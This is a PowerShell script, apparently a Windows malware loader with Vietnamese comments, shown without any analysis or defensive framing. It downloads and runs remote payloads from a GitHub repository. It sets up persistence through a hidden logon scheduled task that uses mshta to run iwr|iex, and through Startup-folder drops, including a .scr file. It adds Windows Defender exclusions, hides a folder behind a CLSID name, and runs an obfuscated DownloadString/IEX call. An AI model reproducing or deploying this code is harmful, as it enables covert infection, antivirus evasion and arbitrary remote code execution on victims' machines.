



Set-ExecutionPolicy Bypass -Scope Process -Force

$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
Add-Type -AssemblyName System.Windows.Forms

if ($env:USERDOMAIN -eq "DESKTOP-S4G27N7") {
    $output = "fuckyou.txt"
    $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/anhsoconnguoiemroido"
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -FilePath $output
}

# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        
        $outputFile = "$startupfolder\download.bat"
        
        # Kiểm tra mức độ UAC và in thông báo
        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}

$task_name = "Updated"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green

Remove-Item -Path "$startupfolder\download.bat" -Force

$rdir = "$env:SystemDrive\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
$output = "$startupfolder\Updated.scr"
Add-MpPreference -ExclusionPath $output

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
}


